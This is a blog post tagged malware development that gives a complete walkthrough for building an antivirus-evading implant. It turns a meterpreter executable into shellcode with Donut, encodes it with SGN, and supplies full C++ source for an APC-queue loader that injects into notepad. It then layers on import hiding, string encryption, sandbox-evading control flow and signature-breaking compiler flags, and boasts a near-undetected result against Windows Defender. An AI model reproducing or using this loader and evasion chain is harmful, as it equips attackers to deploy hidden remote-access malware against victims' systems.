---
title: "APC Queue Injection MSI Payload — Full AV Evasion Chain"
excerpt: "Build a fully obfuscated MSI payload using APC Queue shellcode injection, bypassing Windows Defender with SGN encoding, IAT obfuscation, string encryption, and control flow obfuscation."
categories:
  - malware-development
tags:
  - APC Queue
  - shellcode
  - MSI
  - Windows Defender bypass
  - C++
  - IAT obfuscation
  - SGN encoding
  - donut
toc: true
toc_sticky: true
toc_label: "Contents"
toc_icon: "terminal"
header:
  overlay_color: "#06060f"
  overlay_filter: 0.85
date: 2024-09-05
---

## Outline

![](/assets/AV/APC.png)

We will create a malicious MSI payload containing an obfuscated executable using the APC Queue shellcode injection technique. During this process, we apply multiple obfuscation layers to bypass both signature and behavioral detection: shellcode encoding, IAT obfuscation, string encryption, control flow obfuscation, payload signing, and file bloating.

**APC Queue shellcode injection** abuses Windows' Asynchronous Procedure Call mechanism to inject malicious code into a running process. The attacker writes shellcode into a thread's APC queue; when the target thread next enters an alertable wait state, it executes the injected payload instead of its normal routine — a far less monitored execution vector than `CreateThread`.

The PoC below shows the payload successfully bypassing the latest Windows Defender and establishing a reverse connection to the C2 server.

<video style="max-width: 100%; height: auto;" controls>
  <source src="/assets/AV/MSI.mp4" type="video/mp4">
</video>

---

## EXE to Shellcode

We convert a meterpreter EXE to shellcode using [Donut](https://github.com/TheWover/donut).

The command below loads `piggy.exe` into memory with:

1. No entropy obfuscation (`-e 1`)
2. AMSI/WLDP/ETW bypass with fail-safe continue (`-b 3`)
3. aPLib compression (`-z 2`)
4. Decoy module at level 5 (`-j 5`) for additional evasion

```bash
./donut -i /home/kali/donut/piggy.exe -e 1 -b 3 -z -j 5
```

![](/assets/AV/donutImage.png)

As expected, uploading the raw `shellcode.bin` to VirusTotal yields a high detection rate — we need to encode it.

![](/assets/AV/loaderVirus.png)

---

## Polymorphic Shellcode Encoding (SGN)

Many encoding schemes (XOR, AES, UUID, IPv4) get flagged because their decryption stubs are well-known signatures. We use **SGN — Shikata Ga Nai next-generation**, a polymorphic binary encoder that produces statically undetectable payloads. It is the successor to Metasploit's `shikata_ga_nai.rb`.

Tool: [EgeBalci/sgn](https://github.com/EgeBalci/sgn)

```bash
sgn -i '/home/kali/donut/loader.bin' \
    -o /home/kali/donut/loaderEncrypted.bin \
    -a 64 -c 8 --verbose
```

![](/assets/AV/sgn.png)

The key advantage of SGN is **self-decoding at runtime** — no decryption stub needs to be written into the loader. Simply load and execute the encoded payload bin directly.

Result: **0 detections** after SGN encoding.

![](/assets/AV/zero.png)

---

## APC Shellcode Loader

With encoded shellcode in hand, we build a PE (`.exe`) in C++ that injects it via APC Queue.

**Key Win32 API calls:**

| API | Role |
|-----|------|
| `CreateProcessA` | Spawn target (notepad) in suspended state |
| `VirtualAllocEx` | Allocate RWX memory in target process |
| `WriteProcessMemory` | Copy shellcode into remote process memory |
| `QueueUserAPC` | Queue shellcode as APC on the suspended thread |
| `ResumeThread` | Resume thread, triggering APC execution |

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char* readBinaryFile(const char* fileName, SIZE_T* size) {
    FILE* file = fopen(fileName, "rb");
    if (!file) {
        printf("Could not open file %s\n", fileName);
        return NULL;
    }
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (!buffer) {
        fclose(file);
        return NULL;
    }
    fread(buffer, 1, *size, file);
    fclose(file);
    return buffer;
}

int main() {
    const char* fileName = "loaderEncrypted.bin";
    SIZE_T shellcodeSize;
    unsigned char* shellcode = readBinaryFile(fileName, &shellcodeSize);
    if (!shellcode) return -1;

    // Spawn notepad in a suspended state
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe",
                        NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        free(shellcode);
        return -1;
    }

    // Allocate RWX memory in the remote process
    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                       MEM_RESERVE | MEM_COMMIT,
                                       PAGE_EXECUTE_READWRITE);
    if (!bufferAddr) { free(shellcode); return -1; }

    // Write shellcode into remote memory
    if (!WriteProcessMemory(pi.hProcess, bufferAddr,
                            shellcode, shellcodeSize, NULL)) {
        free(shellcode);
        return -1;
    }

    // Queue APC — shellcode executes when thread enters an alertable wait state
    QueueUserAPC((PAPCFUNC)bufferAddr, pi.hThread, NULL);
    ResumeThread(pi.hThread);

    free(shellcode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

---

## IAT Obfuscation

Calling `VirtualAllocEx`, `QueueUserAPC`, and `WriteProcessMemory` directly places them in the **Import Address Table (IAT)** — an immediate red flag visible in any PE analysis tool like [PE Studio](https://www.winitor.com/).

![](/assets/AV/PE.png)

**Dynamic resolution via `GetProcAddress`** removes imports from the IAT:

```cpp
HMODULE hKernel32 = GetModuleHandle("kernel32.dll");

LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))
    GetProcAddress(hKernel32, "VirtualAllocEx");
```

For a cleaner implementation, use [lazy_importer](https://github.com/JustasMasiulis/lazy_importer) — drop `lazy_importer.hpp` into your `include/` directory and wrap any call with `LI_FN()`:

```cpp
LI_FN(VirtualAllocEx)(pi.hProcess, NULL, shellcodeSize,
                      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

---

## String Obfuscation

Plain string literals survive static analysis. Running `strings.exe` on the implant immediately reveals the notepad path:

```bash
strings.exe -n 8 implant.exe | findstr /i "C:\\windows"
```

![](/assets/AV/string.png)

**Fix:** use [skCrypter](https://github.com/skadro-official/skCrypter) to encrypt all string literals at compile time and decrypt at runtime:

```cpp
#include "skCrypter.h"

CreateProcessA(skCrypt("C:\\Windows\\System32\\notepad.exe"),
               NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```

The string is stored encrypted in the binary and only decrypted in-memory at runtime — invisible to static scanners.

---

## Control Flow Obfuscation

Behavioral and heuristic engines trace the logical sequence: allocate → write → execute. A state machine with interspersed benign actions breaks that sequence and disrupts automated analysis.

```cpp
enum State {
    STATE_ALLOCATE,
    STATE_BENIGN,
    STATE_WRITE,
    STATE_BENIGN_AGAIN,
    STATE_EXECUTE,
    STATE_DONE
};

void obfuscatedControlFlow(
    LPVOID shellcode, SIZE_T shellcodeSize,
    PROCESS_INFORMATION* pi,
    LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD),
    BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*),
    DWORD  (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR))
{
    State state = STATE_ALLOCATE;
    LPVOID bufferAddr = NULL;

    while (state != STATE_DONE) {
        switch (state) {
            case STATE_ALLOCATE:
                bufferAddr = pVirtualAllocEx(pi->hProcess, NULL, shellcodeSize,
                                             MEM_RESERVE | MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE);
                if (bufferAddr) state = STATE_BENIGN;
                break;

            case STATE_BENIGN:
                performBenignActions(); // file reads, registry queries, etc.
                advancedSleep();
                state = STATE_WRITE;
                break;

            case STATE_WRITE:
                if (pWriteProcessMemory(pi->hProcess, bufferAddr,
                                        shellcode, shellcodeSize, NULL))
                    state = STATE_BENIGN_AGAIN;
                else
                    state = STATE_DONE;
                break;

            case STATE_BENIGN_AGAIN:
                performBenignActions();
                state = STATE_EXECUTE;
                break;

            case STATE_EXECUTE:
                advancedSleep();
                randomSleep(10000, 110000);
                pQueueUserAPC((PAPCFUNC)bufferAddr, pi->hThread, NULL);
                state = STATE_DONE;
                break;

            default:
                state = STATE_DONE;
        }
    }
}
```

The `performBenignActions()` function executes real but harmless Windows operations to confuse sandbox timelines and heuristic engines. `randomSleep()` adds non-deterministic delays that defeat fixed-timeout sandbox analysis.

---

## Compiler Flag Obfuscation

Different compiler flags produce structurally distinct PE files, breaking signature-based detection that relies on predictable binary layouts. Each rebuild generates a unique file.

| Flag | Effect |
|------|--------|
| `-O2` | Speed-optimize; reorganizes code blocks |
| `-Ob2` | Aggressive inlining; merges functions |
| `-Os` | Size-optimize; smaller footprint |
| `-fno-stack-protector` | Removes stack canary code patterns |
| `-fno-unroll-loops` | Keeps loops compact; less predictable |
| `-s` | Strips debug symbols |
| `-Xlinker -pdb:none` | Removes PDB metadata entirely |

```bash
# LLVM/Clang — console binary
clang++ -O2 -Ob2 -Os -fno-stack-protector -fno-unroll-loops \
        -fno-exceptions -fno-rtti -s \
        -o implant.exe implant.cpp -luser32 -lkernel32

# With linker flags (GNU toolchain)
clang++ -O2 -Ob2 -Os -fno-stack-protector -fno-unroll-loops \
        -fno-exceptions -fno-rtti \
        -Xlinker -pdb:none -Xlinker -subsystem:console \
        -o malware.exe implant.cpp -luser32 -lkernel32
```

---

## Results

Uploading the fully obfuscated `implant.exe` achieves **2 / 39 detections** on [Kleenscan](https://kleenscan.com/scan_result/d7abfbf0cddff7295257abcaafde2181b88ce647e18e2bc51c2d5f82425bb120).

The two remaining detections are heuristic-based and are addressable by adding additional benign code sections, file bloating, or payload signing with a valid Authenticode certificate.

---

## Conclusion

This walkthrough demonstrated a complete, layered AV evasion chain:

1. **Donut** — converts a PE to position-independent shellcode
2. **SGN** — polymorphic encoding produces a unique, statically undetectable payload
3. **APC Queue injection** — executes shellcode inside a suspended legitimate process
4. **IAT obfuscation** — hides API imports from static scanners via dynamic resolution
5. **String obfuscation** — encrypts string literals with skCrypter at compile time
6. **Control flow obfuscation** — disguises the injection sequence with a state machine and benign noise
7. **Compiler flags** — generates structurally unique PE files on every rebuild

Each layer independently reduces detection probability — combined, they compound into a highly evasive payload, achieving a 2/39 detection rate with Windows Defender bypassed entirely.
